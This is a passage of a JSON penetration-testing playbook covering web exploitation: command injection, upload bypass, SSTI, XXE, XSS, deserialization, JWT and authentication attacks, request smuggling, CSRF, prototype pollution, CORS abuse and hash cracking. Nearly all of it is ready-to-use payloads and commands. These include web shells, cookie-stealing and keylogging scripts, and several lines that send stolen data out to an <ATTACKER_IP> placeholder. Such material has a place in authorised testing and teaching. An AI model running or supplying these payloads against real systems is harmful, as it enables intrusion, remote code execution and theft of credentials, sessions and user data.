    "step": "5.5 Command Injection",
    "title": "OS command injection",
    "feasible_when": "A web app passes user input to OS commands (ping, dig, nslookup, file converters, etc.).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Linux separator payloads\n; id\n| id\n|| id\n& id\n&& id\n$(id)\n`id`\n%0a id           # URL-encoded newline\n127.0.0.1; id\n127.0.0.1 | id\n127.0.0.1 && id\n127.0.0.1; $(id)\n\n# Windows separators\n& whoami\n| whoami\n|| whoami\n&& whoami\n127.0.0.1 & whoami\n127.0.0.1 && whoami\n127.0.0.1 | whoami\n; whoami\n\\n whoami\n\n# Blind command injection (no output returned)\n# Time-based\n; sleep 5\n127.0.0.1; sleep 5\n' ; sleep 5 '\n\n# Out-of-band (DNS callback)\n; nslookup <ATTACKER_IP>\n; curl http://<ATTACKER_IP>/?a=$(id|base64)\n; ping -c 1 <ATTACKER_IP>\n; wget http://<ATTACKER_IP>/$(id|base64)\n\n# Filter bypass — space alternatives\n; id\n;{id}\n;{IFS}id\n;$IFS$9id\n;$(printf '\\t')id  # tab\ncurl$IFS'http://<ATTACKER_IP>/'\ncat</etc/passwd\n\n# Filter bypass — quote tricks\n'i'd'\n\"whoami\"\ni''d\nwhoam''i\n\n# Filter bypass — variable tricks\n$u='id'; $u\na=i;b=d;$a$b\n\n# Positional test\n# 1. Change URL param: ?ip=127.0.0.1|id\n# 2. Change POST body field\n# 3. Change User-Agent/Referer/X-Forwarded-For header\n# 4. Change filename in upload\n\n# PowerShell injection\n; powershell -c whoami\n; powershell -enc <BASE64_ENCODED_CMD>"
      }
    ],
    "brief_description": "Test all injection separators and check every input field including headers. Use time/DNS to detect blind injection."
  },
  {
    "id": "item-57",
    "phase": "5. Exploitation",
    "step": "5.6 File Upload Bypass",
    "title": "File upload restrictions bypass",
    "feasible_when": "A web app has file upload and the uploaded files are accessible via HTTP.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# PHP extension bypasses\n.php → .php5, .phtml, .phar, .php3, .php4, .php7, .phps, .pht\n.php → .PHP, .PhP, .pHp (case variation)\n.php → .php.jpg (double extension)\n.php → .php%00.jpg (null byte — old PHP)\n.php → .php;.jpg (semicolon)\n.php → .php.xxxjpg (strip after last dot)\n\n# ASP/ASPX\n.asp → .aspx, .cer, .asa, .ashx, .asmx, .shtml\n\n# JSP\n.jsp → .jspx, .jspf, .jspa\n\n# Magic bytes bypass — prepend to PHP file\nGIF89a;                                          # GIF header\n\\xff\\xd8\\xff\\xe0                                # JPEG header\n\\x89PNG\\r\\n\\x1a\\n                              # PNG header\n\n# Create polyglot (valid image + PHP)\ncp legitimate.jpg /tmp/shell.jpg\necho '<?php system($_GET[\"cmd\"]); ?>' >> /tmp/shell.jpg\n# Then upload as image and include via LFI\n\n# Content-Type bypass (change in Burp)\nContent-Type: application/x-php → image/jpeg\nContent-Type: application/x-php → image/gif\nContent-Type: application/x-php → image/png\n\n# .htaccess upload (Apache — enables PHP in dir)\necho 'AddType application/x-httpd-php .jpg' > /tmp/.htaccess\n# Upload .htaccess then upload shell.jpg\n\n# web.config upload (IIS)\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n  <system.webServer>\n    <handlers accessPolicy=\"Read, Script, Write\">\n      <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\"/>\n    </handlers>\n    <security><requestFiltering><fileExtensions><remove fileExtension=\".config\"/></fileExtensions></requestFiltering></security>\n  </system.webServer>\n</configuration>\n<%@ Language=VBScript %>\n<%  call Server.CreateObject(\"WSCRIPT.SHELL\").Run(\"cmd.exe /c whoami > C:\\inetpub\\wwwroot\\out.txt\") %>\n\n# Filename path traversal\n../../../var/www/html/shell.php\n%2e%2e%2f%2e%2e%2fshell.php\n\n# SVG upload (XSS/XXE)\ncat > /tmp/evil.svg << 'EOF'\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <script>document.location='http://<ATTACKER_IP>/?c='+document.cookie</script>\n</svg>\nEOF\n\n# XML upload (XXE)\ncat > /tmp/evil.xml << 'EOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\nEOF\n\n# Exiftool embed PHP in image metadata\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg\nmv image.jpg shell.jpg.php"
      }
    ],
    "brief_description": "Layer multiple bypasses — extension + MIME type + magic bytes. .htaccess upload enables PHP for any extension."
  },
  {
    "id": "item-58",
    "phase": "5. Exploitation",
    "step": "5.7 Server-Side Template Injection (SSTI)",
    "title": "SSTI detection & exploitation",
    "feasible_when": "A web app renders user input through a template engine (Jinja2, Twig, Mako, Freemarker, etc.).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Detection — inject math expression\n{{7*7}}          → 49  (Jinja2 / Twig)\n${7*7}           → 49  (FreeMarker / Groovy / Mako)\n#{7*7}           → 49  (Ruby ERB)\n<%= 7*7 %>       → 49  (Ruby ERB / ASP / EJS)\n${{7*7}}         → 49  (Pebble)\n{{7*'7'}}        → 7777777 (Jinja2, not Twig)\n{% 7*7 %}        → nothing (Twig block syntax)\n*{7*7}           → 49  (Thymeleaf)\n\n# Decision tree:\n# Does {{7*7}} → 49? → Jinja2 or Twig\n#   Does {{7*'7'}} → 7777777? → Jinja2\n#   Does {{7*'7'}} → 49? → Twig\n# Does ${7*7} → 49? → FreeMarker / Mako / Groovy\n\n# Jinja2 RCE (Python)\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}\n# Find subprocess class index:\n{{''.__class__.__mro__[1].__subclasses__()}}\n# With underscores filtered:\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\n\n# Twig RCE (PHP)\n{{['id']|filter('system')}}\n{{['id']|map('system')|join}}\n{{_self.env.registerUndefinedFilterCallback('exec')}}\n{{_self.env.getFilter('id')}}\n\n# FreeMarker RCE (Java)\n<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n<#assign classloader=article.class.protectionDomain.classLoader>\n<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(owc)>\n<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>\n${dwf.newInstance(ec, null)(\"id\")}\n\n# Tornado/Mako RCE (Python)\n{% import os %}{{ os.popen('id').read() }}\n${__import__('os').popen('id').read()}\n\n# Pebble RCE (Java)\n{# not a comment #}{% if true %}{{ \"freemarker.template.utility.Execute\"?new()(\"id\") }}{% endif %}\n\n# Handlebars RCE (Node.js)\n{{#with \"s\" as |string|}}\n  {{#with \"e\"}}{{#with split as |conslist|}}\n    {{this.pop}}{{this.push (lookup string.sub \"constructor\")}}\n    {{this.pop}}{{#with string.split as |codelist|}}\n      {{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}\n      {{this.pop}}{{#each conslist}}\n        {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}\n      {{/each}}\n    {{/with}}\n  {{/with}}{{/with}}\n{{/with}}\n\n# SSTImap (automated)\nsstimap -u 'http://<TARGET_IP>/page?name=test'\nsstimap -u 'http://<TARGET_IP>/page?name=test' -e Jinja2 --os-cmd id\nsstimap -r request.txt"
      }
    ],
    "brief_description": "SSTI detection: inject math and check if it evaluates. Engine determines exploit chain. SSTImap automates it all."
  },
  {
    "id": "item-59",
    "phase": "5. Exploitation",
    "step": "5.8 XML External Entity (XXE)",
    "title": "XXE injection",
    "feasible_when": "A web app parses XML input (APIs, document upload, SOAP, JSON-to-XML conversion).",
    "snippets": [
      {
        "lang": "xml",
        "code": "<!-- Classic XXE — file read -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n\n<!-- Windows file read -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>\n<root>&xxe;</root>\n\n<!-- XXE via SSRF -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://<ATTACKER_IP>/?test\">]>\n<root>&xxe;</root>\n\n<!-- AWS metadata via XXE+SSRF -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>\n\n<!-- Blind XXE via OOB DTD -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://<ATTACKER_IP>/evil.dtd\">%dtd;]>\n<root>&exfil;</root>\n<!-- evil.dtd hosted on attacker: -->\n<!-- <!ENTITY % file SYSTEM \"file:///etc/passwd\"> -->\n<!-- <!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://<ATTACKER_IP>/?data=%file;'>\"> -->\n<!-- %eval; -->\n\n<!-- PHP wrapper -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>\n<root>&xxe;</root>\n\n<!-- XXE via file upload (Word/Excel/SVG/PDF) -->\n<!-- Rename to .docx, inject in document.xml -->\n\n<!-- JSON to XML XXE -->\n<!-- Change Content-Type: application/json to application/xml -->"
      },
      {
        "lang": "bash",
        "code": "# Host malicious DTD\ncat > /tmp/evil.dtd << 'EOF'\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://<ATTACKER_IP>/?d=%file;'>\">\n%eval;\nEOF\npython3 -m http.server 80\n\n# Send XXE payload\ncurl -d @payload.xml -H 'Content-Type: application/xml' http://<TARGET_IP>/api/endpoint\n\n# XXEInjector (automated)\nruby XXEinjector.rb --host=<ATTACKER_IP> --path=/etc/passwd --file=request.txt --oob=http\n\n# Check for XXE in JSON APIs (try changing Content-Type)\ncurl -H 'Content-Type: application/xml' -d '<?xml...?>' http://<TARGET_IP>/api/login"
      }
    ],
    "brief_description": "XXE reads local files and enables SSRF. Blind OOB XXE exfiltrates data via DNS/HTTP even without output."
  },
  {
    "id": "item-60",
    "phase": "5. Exploitation",
    "step": "5.9 Cross-Site Scripting (XSS)",
    "title": "XSS — session stealing & escalation",
    "feasible_when": "A web app reflects or stores user input without sanitization and a privileged user exists.",
    "snippets": [
      {
        "lang": "html",
        "code": "<!-- Basic payloads -->\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n\n<!-- Cookie stealing -->\n<script>document.location='http://<ATTACKER_IP>/?c='+document.cookie</script>\n<script>fetch('http://<ATTACKER_IP>/?c='+btoa(document.cookie))</script>\n<img src=x onerror=\"fetch('http://<ATTACKER_IP>/?c='+btoa(document.cookie))\">\n<svg onload=\"document.location='http://<ATTACKER_IP>/?c='+document.cookie\">\n\n<!-- Keylogger -->\n<script>document.onkeypress=function(e){fetch('http://<ATTACKER_IP>/?k='+String.fromCharCode(e.charCode))}</script>\n\n<!-- Internal network scan via XSS -->\n<script>\nfor(var i=1;i<255;i++){\n  var img=new Image();\n  img.src='http://192.168.1.'+i+':80/';\n  img.onerror=function(){fetch('http://<ATTACKER_IP>/?h='+this.src)}\n}\n</script>\n\n<!-- XSS filter bypasses -->\n<ScRiPt>alert(1)</ScRiPt>                     <!-- case variation -->\n<script >alert(1)</script>                    <!-- space -->\n<img src=\"x\" oNErrOr=\"alert(1)\">              <!-- case on event -->\n<scr<script>ipt>alert(1)</scr</script>ipt>    <!-- nested -->\n<%00script>alert(1)</script>                  <!-- null byte -->\n<script/src='data:,alert(1)'></script>         <!-- data URI -->\njavascript:alert(1)                            <!-- protocol -->\n<iframe src=\"javascript:alert(1)\"></iframe>    <!-- iframe -->\n<details open ontoggle=alert(1)>              <!-- HTML5 -->\n<video><source onerror=alert(1)>              <!-- video -->\n<svg><animatetransform onbegin=alert(1)>      <!-- SVG -->"
      },
      {
        "lang": "bash",
        "code": "# Set up listener for stolen cookies\nnc -nlvp 80\npython3 -m http.server 80\n\n# Use stolen cookie in browser or curl\ncurl -b 'session=<STOLEN_COOKIE>' http://<TARGET_IP>/admin/\n\n# XSS to account takeover via CSRF token steal\n# 1. XSS fetches admin page with CSRF token\n# 2. XSS sends CSRF token + password change request\n\n# BeEF XSS framework\nbeef-xss  # hook.js served at http://<ATTACKER_IP>:3000/hook.js\n<script src='http://<ATTACKER_IP>:3000/hook.js'></script>\n\n# XSSStrike (automated XSS scanner)\npython3 xsstrike.py -u 'http://<TARGET_IP>/page?q=test'\npython3 xsstrike.py -u 'http://<TARGET_IP>/page' --data 'q=test' --form"
      }
    ],
    "brief_description": "Stored XSS against admins can steal sessions and escalate to RCE via admin functions."
  },
  {
    "id": "item-61",
    "phase": "5. Exploitation",
    "step": "5.10 Insecure Deserialization",
    "title": "Deserialization attacks",
    "feasible_when": "A web app deserializes user-controlled data (Java serialized objects, PHP unserialize, Python pickle, .NET BinaryFormatter).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Detection signatures\n# Java: rO0AB (base64) or \\xac\\xed\\x00\\x05 (raw) or Content-Type: application/x-java-serialized-object\n# PHP: a:2:{...} or O:8:\"UserData\" or C:...\n# Python: \\x80\\x03 (pickle), gASV (base64 pickle)\n# .NET: AAEAAAD... (base64), 0000000 (binary)\n# Ruby: \\x04\\x08 (Marshal)\n\n# Java — ysoserial\njava -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0\njava -jar ysoserial.jar CommonsCollections6 'curl http://<ATTACKER_IP>/?a=$(id|base64)' | base64 -w0\njava -jar ysoserial.jar URLDNS 'http://<ATTACKER_IP>/' | base64 -w0  # blind detect\njava -jar ysoserial.jar Jdk7u21 'bash -c {echo,<BASE64_CMD>}|{base64,-d}|bash' | base64 -w0\n# All chains to try: CommonsCollections1-7, Spring1-2, Jdk7u21, ROME, JSON1, BeanShell1\n\n# Python pickle RCE\ncat > /tmp/gen_pickle.py << 'EOF'\nimport pickle, os, base64\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('curl http://<ATTACKER_IP>/?a=$(id|base64)',))\nprint(base64.b64encode(pickle.dumps(Exploit())).decode())\nEOF\npython3 /tmp/gen_pickle.py\n\n# PHP unserialize — phpggc\nphpggc Laravel/RCE1 system id | base64 -w0\nphpggc Symfony/RCE4 exec 'id' | base64 -w0\nphpggc --list  # show all gadget chains\nphpggc -l PHP  # PHP generic chains\n\n# .NET — YSoSerial.NET\nysoserial.exe -g TypeConfuseDelegate -f Json.Net -c 'whoami > C:\\tmp\\out.txt'\nysoserial.exe -g ObjectDataProvider -f Xaml -c 'powershell whoami'\n\n# Ruby Marshal\npython3 -c \"\nimport struct, subprocess\npayload = b'\\x04\\x08' + b'...'  # construct Ruby Marshal payload\n\"\n\n# Burp extension: Java Deserialization Scanner, Freddy"
      }
    ],
    "brief_description": "Identify serialization format by its signature bytes. Use ysoserial/phpggc to generate gadget chain payloads."
  },
  {
    "id": "item-62",
    "phase": "5. Exploitation",
    "step": "5.11 Authentication Attacks",
    "title": "Authentication bypass, brute-force & JWT attacks",
    "feasible_when": "A login page or authentication mechanism is present.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# SQLi auth bypass\nadmin'--\nadmin' #\nadmin'/*\n' OR 1=1--\n' OR '1'='1\nadmin' OR 1=1--\n' OR ''='\nusername=admin'--&password=anything\n\n# Default credentials (always try first)\n# admin:admin, admin:password, admin:admin123, admin:password123\n# root:root, root:toor, test:test, guest:guest\n# admin:(blank), administrator:admin\n# Check: https://default-password.info\n\n# Hydra web form brute-force\nhydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials' -V\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login:user=^USER^&pass=^PASS^:F=Login failed'\nhydra -l admin -P /usr/share/wordlists/rockyou.txt -s 443 <TARGET_IP> https-post-form '/login:username=^USER^&password=^PASS^:F=Error'\n\n# ffuf web brute\nffuf -w passwords.txt -u http://<TARGET_IP>/login -X POST -d 'username=admin&password=FUZZ' -fc 302,401 -o recon/web/login_brute.json\n\n# JWT attacks\n# Decode JWT (no verification)\ncat jwt.txt | cut -d'.' -f1 | base64 -d 2>/dev/null; echo\ncat jwt.txt | cut -d'.' -f2 | base64 -d 2>/dev/null; echo\n\n# JWT alg=none bypass\n# 1. Decode header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n# 2. Change to: {\"alg\":\"none\",\"typ\":\"JWT\"}\n# 3. Remove signature, keep trailing dot\npython3 -c \"\nimport base64, json\nheader = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')\nprint(f'{header}.{payload}.')\n\"\n\n# JWT secret brute-force\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt\n\n# jwt_tool (comprehensive JWT testing)\njwt_tool <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt  # crack\njwt_tool <JWT_TOKEN> -T                                       # tamper mode\njwt_tool <JWT_TOKEN> -X a                                     # alg=none\njwt_tool <JWT_TOKEN> -X s                                     # self-signed\njwt_tool <JWT_TOKEN> -X k -pk public.pem                     # RS256→HS256\n\n# OAuth attacks\n# Open redirect in redirect_uri\n# CSRF on authorization flow\n# Token leakage via Referer"
      }
    ],
    "brief_description": "Always try SQLi bypass and default creds before brute-force. JWT alg=none and secret cracking are high-value."
  },
  {
    "id": "item-63",
    "phase": "5. Exploitation",
    "step": "5.12 GraphQL Attacks",
    "title": "GraphQL enumeration & exploitation",
    "feasible_when": "A GraphQL endpoint is detected at /graphql, /api/graphql, or /query.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Introspection query (enumerate schema)\ncurl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name,fields{name,args{name,type{name,kind}}}}}}\"}'\n\n# List all types\ncurl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name}}}\"}'\n\n# Get type fields\ncurl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__type(name:\\\"User\\\"){fields{name,type{name}}}}\"}'\n\n# Query all users (once schema is known)\ncurl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{users{id,username,email,password}}\"}'\n\n# Mutation-based attacks\ncurl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"mutation{createUser(username:\\\"admin\\\",password:\\\"hacked\\\",role:\\\"admin\\\"){ token}}\"}'\n\n# GraphQL SQLi\ncurl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{user(id:\\\"1 OR 1=1\\\"){username,email}}\"}'\n\n# GraphQL introspection bypass\n# Try: __schema → __Schema, fragment on __Type\n# Try GET request instead of POST\ncurl 'http://<TARGET_IP>/graphql?query={__schema{types{name}}}'\n\n# InQL (Burp extension) — GraphQL scanner\n# graphql-voyager — visual schema explorer\n\n# graphw00f — fingerprint GraphQL implementation\ngraphw00f -t http://<TARGET_IP>/graphql"
      }
    ],
    "brief_description": "GraphQL introspection dumps the entire schema — find sensitive queries, mutations, and injection points."
  },
  {
    "id": "item-64",
    "phase": "5. Exploitation",
    "step": "5.13 HTTP Request Smuggling",
    "title": "HTTP Request Smuggling",
    "feasible_when": "A reverse proxy/CDN sits in front of a backend server with inconsistent handling of Transfer-Encoding and Content-Length headers.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# CL.TE smuggling (frontend uses CL, backend uses TE)\ncurl -s http://<TARGET_IP>/ -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -H 'Content-Length: 6' \\\n  -H 'Transfer-Encoding: chunked' \\\n  -d $'3\\r\\nabc\\r\\n0\\r\\n\\r\\nX'\n\n# TE.CL smuggling (frontend uses TE, backend uses CL)\ncurl -s http://<TARGET_IP>/ \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -H 'Transfer-Encoding: chunked' \\\n  --data-binary $'b\\r\\nq=smuggled\\r\\n0\\r\\n\\r\\n'\n\n# h2smugl (HTTP/2 desync)\npython3 h2smugl.py -u http://<TARGET_IP>/\n\n# Burp Suite Scanner — best tool for detection\n# Use HTTP Request Smuggler extension\n# Smuggler.py\npython3 smuggler.py -u http://<TARGET_IP>/\n\n# HTTP Desync Attacks tool\npython3 desync.py -u http://<TARGET_IP>/ --payloads timeout"
      }
    ],
    "brief_description": "HTTP smuggling can bypass WAFs, poison caches, and hijack sessions — test when a proxy is detected."
  },
  {
    "id": "item-65",
    "phase": "5. Exploitation",
    "step": "5.14 Cross-Site Request Forgery (CSRF)",
    "title": "CSRF exploitation",
    "feasible_when": "A web app performs state-changing actions and lacks CSRF tokens or has predictable ones.",
    "snippets": [
      {
        "lang": "html",
        "code": "<!-- GET-based CSRF -->\n<img src=\"http://<TARGET_IP>/admin/delete_user?id=1\">\n\n<!-- POST-based CSRF (auto-submit) -->\n<html>\n  <body onload='document.forms[0].submit()'>\n    <form action='http://<TARGET_IP>/admin/create_user' method='POST'>\n      <input name='username' value='hacker'>\n      <input name='password' value='hacked123'>\n      <input name='role' value='admin'>\n    </form>\n  </body>\n</html>\n\n<!-- JSON CSRF -->\n<script>\nfetch('http://<TARGET_IP>/api/update_password', {\n  method: 'POST',\n  headers: {'Content-Type': 'text/plain'},\n  body: JSON.stringify({newPassword: 'hacked123'}),\n  credentials: 'include'\n})\n</script>\n\n<!-- CSRF bypass techniques -->\n<!-- Same-site none: Lax — try GET for state changes -->\n<!-- CSRF token bypass: steal via XSS -->\n<!-- Referrer-based: use data: URI or meta refresh -->"
      }
    ],
    "brief_description": "CSRF exploits authenticated users — combine with XSS for token bypass. Focus on admin panel actions."
  },
  {
    "id": "item-66",
    "phase": "5. Exploitation",
    "step": "5.15 Prototype Pollution",
    "title": "JavaScript prototype pollution",
    "feasible_when": "A Node.js web application merges or assigns user-supplied objects (lodash.merge, jQuery.extend, etc.).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Detection — inject __proto__\ncurl -X POST http://<TARGET_IP>/api/merge \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"polluted\":\"yes\"}}'\n\n# Client-side detection (browser)\n# URL: http://<TARGET_IP>/?__proto__[polluted]=yes\n# URL: http://<TARGET_IP>/?constructor.prototype.polluted=yes\n# Check: Object.prototype.polluted === 'yes'\n\n# RCE via prototype pollution (Node.js)\n# Via child_process spawn:\n{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"console.log(require('child_process').execSync('id').toString())//\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}\n\n# Via template engines (Pug)\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').execSync('id');var __tmp2\"}}\n\n# AST injection (Handlebars)\n{\"__proto__\":{\"pendingContent\":\"<script>alert(1)</script>\"}}\n\n# Tools\nnpm audit  # if source available\npython3 ppfuzz.py -u 'http://<TARGET_IP>/api' --data '{}'  # automated"
      }
    ],
    "brief_description": "Prototype pollution corrupts JavaScript's Object.prototype — can lead to DoS, auth bypass, or RCE in Node.js."
  },
  {
    "id": "item-67",
    "phase": "5. Exploitation",
    "step": "5.16 Open Redirect",
    "title": "Open redirect exploitation",
    "feasible_when": "A web application redirects users based on URL parameters (redirect=, url=, next=, return=, goto=).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Basic detection\ncurl -v 'http://<TARGET_IP>/redirect?url=http://<ATTACKER_IP>/' 2>&1 | grep -i location\ncurl -v 'http://<TARGET_IP>/login?next=http://<ATTACKER_IP>/' 2>&1 | grep -i location\ncurl -v 'http://<TARGET_IP>/oauth/callback?redirect_uri=http://<ATTACKER_IP>/' 2>&1 | grep -i location\n\n# Bypass filters\n# Double slash: //evil.com\n# Protocol bypass: http:\\/\\/evil.com\n# Whitelist bypass: evil.com?legit.com, evil.com#legit.com\n# Unicode: http://ᴱⱽⱵL.com\n\n# OAuth redirect_uri abuse (steal tokens)\n# Point to attacker-controlled server and capture access tokens\n\n# Phishing with trusted domain redirect\ncurl 'http://<TRUSTED_SITE>/redirect?url=http://<ATTACKER_IP>/phishing'"
      }
    ],
    "brief_description": "Open redirects enable phishing with trusted domains and can steal OAuth tokens via redirect_uri manipulation."
  },
  {
    "id": "item-68",
    "phase": "5. Exploitation",
    "step": "5.17 CORS Misconfiguration",
    "title": "CORS misconfiguration exploitation",
    "feasible_when": "A web app returns Access-Control-Allow-Origin based on user-supplied Origin header.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Check CORS headers\ncurl -H 'Origin: http://evil.com' -I http://<TARGET_IP>/api/user\ncurl -H 'Origin: https://attacker.com' -s http://<TARGET_IP>/api/data\n\n# Check if null origin allowed\ncurl -H 'Origin: null' -I http://<TARGET_IP>/api/\n\n# Check Access-Control-Allow-Credentials\ncurl -H 'Origin: http://evil.com' -v http://<TARGET_IP>/api/profile 2>&1 | grep -iE 'access-control'\n\n# Exploit — steal data from authenticated user (host on attacker)\ncat > /tmp/cors_exploit.html << 'EOF'\n<html>\n<script>\nfetch('http://<TARGET_IP>/api/profile', {credentials:'include'})\n  .then(r => r.text())\n  .then(d => fetch('http://<ATTACKER_IP>/?d='+btoa(d)))\n</script>\n</html>\nEOF\n\n# Regex bypass\n# Target reflects: evil.victim.com → try: evilxxxvictim.com\n# Target reflects prefix: victim.com → try: victim.com.evil.com\n# Wildcard: *.victim.com → any subdomain (find XSS in subdomain)"
      }
    ],
    "brief_description": "Reflected Origin or null origin with credentials=true allows cross-origin data theft from authenticated sessions."
  },
  {
    "id": "item-69",
    "phase": "5. Exploitation",
    "step": "5.18 Password Attacks",
    "title": "Hash identification & cracking",
    "feasible_when": "Password hashes obtained from /etc/shadow, SAM dump, database, config file, or traffic capture.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Hash identification\nhashid '<HASH>'\nhash-identifier\nname-that-hash -t '<HASH>'  # more accurate\n\n# hashcat (GPU cracking — preferred)\nhashcat -m 0    <HASH_FILE> /usr/share/wordlists/rockyou.txt          # MD5\nhashcat -m 100  <HASH_FILE> /usr/share/wordlists/rockyou.txt          # SHA1\nhashcat -m 1000 <HASH_FILE> /usr/share/wordlists/rockyou.txt          # NTLM\nhashcat -m 1800 <HASH_FILE> /usr/share/wordlists/rockyou.txt          # sha512crypt ($6$)\nhashcat -m 500  <HASH_FILE> /usr/share/wordlists/rockyou.txt          # md5crypt ($1$)\nhashcat -m 3200 <HASH_FILE> /usr/share/wordlists/rockyou.txt          # bcrypt ($2y$)\nhashcat -m 400  <HASH_FILE> /usr/share/wordlists/rockyou.txt          # phpass (WordPress)\nhashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt          # NetNTLMv2\nhashcat -m 5500 <HASH_FILE> /usr/share/wordlists/rockyou.txt          # NetNTLMv1\nhashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt         # Kerberoast (TGS-REP)\nhashcat -m 18200 <HASH_FILE> /usr/share/wordlists/rockyou.txt         # AS-REP Roast\nhashcat -m 13400 <HASH_FILE> /usr/share/wordlists/rockyou.txt         # KeePass\nhashcat -m 22931 <HASH_FILE> /usr/share/wordlists/rockyou.txt         # SSH private key (new)\nhashcat -m 22921 <HASH_FILE> /usr/share/wordlists/rockyou.txt         # SSH private key (old)\nhashcat -m 7400  <HASH_FILE> /usr/share/wordlists/rockyou.txt         # SHA256crypt ($5$)\nhashcat -m 10    <HASH_FILE> /usr/share/wordlists/rockyou.txt         # MD5($pass.$salt)\nhashcat -m 20    <HASH_FILE> /usr/share/wordlists/rockyou.txt         # MD5($salt.$pass)\nhashcat -m 7300  <HASH_FILE> /usr/share/wordlists/rockyou.txt         # IPMI2 RAKP\n\n# Rules (dramatically improve cracking)\nhashcat -m 1000 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\nhashcat -m 1000 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule\nhashcat -m 1000 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule\nhashcat -m 1000 <HASH_FILE> wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule\n\n# Mask attacks (when pattern is known)\nhashcat -m 1000 <HASH_FILE> -a 3 ?u?l?l?l?l?d?d?d    # CapLowerLowerLowerLower##\nhashcat -m 1000 <HASH_FILE> -a 3 ?u?l?l?l?l?l?d?s    # Word + digit + special\nhashcat -m 1000 <HASH_FILE> -a 3 Company?d?d?d?d     # Company + 4 digits\n\n# Combination attack\nhashcat -m 1000 